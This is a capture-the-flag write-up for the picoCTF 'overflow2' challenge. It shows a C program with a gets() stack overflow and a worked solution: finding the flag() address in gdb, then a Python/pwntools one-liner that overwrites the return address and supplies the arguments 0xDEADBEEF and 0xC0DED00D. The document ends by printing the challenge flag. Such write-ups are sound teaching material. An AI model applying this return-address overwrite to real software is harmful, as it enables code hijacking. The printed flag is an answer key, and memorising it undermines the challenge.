# overflow2

## Problem

Now try overwriting arguments. Can you get the flag from this program? You can find
it in /problems/overflow-2_2_47d6bbdfb1ccd0d65a76e6cbe0935b0f on the shell server.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Solution

Most of the code is similar. So this time, let's focus on the `flag` function instead:

```
void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}
```

Now things are getting spicy! Looks like we need to also through some specific function argument
values into the mix. This shouldn't be too bad... A lot of the process will be similar to the
previous exercise, so I'm going to gloss over much of the description of what we're doing until
we get to the differences. Let's start by identifying the buffer size from the source:

```
#define BUFSIZE 176
```

Next, we find our target address for the `flag` function:

```
gdb vuln

> diasm flag
```

flag func address = `0x080485e6`

Great! Let's first try to send an overflow that calls `flag` normally, but without the arguments.
Buffer size is 176, add 12 bonus characters, then the return address like so:

```
python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)" | ./vuln
```

We got our segfault but no flag, as we expected. The source shows that our arguments need to have
specific values:

- arg1: 0xDEADBEEF
- arg2: 0xC0DED00D

There is an addition DWORD value on the stack after the return address (to be honest, I'm not sure
what it does) which we will need to overwrite prior to adding our function arg values into the exploit.
We'll fill this extra data space with `PPPP` so we can identify it, then append the little endian
version of our args onto the stack:

```
python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)+'P'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln
```

Success!

**Flag: picoCTF{arg5_and_r3turn5ce5cf61a}**
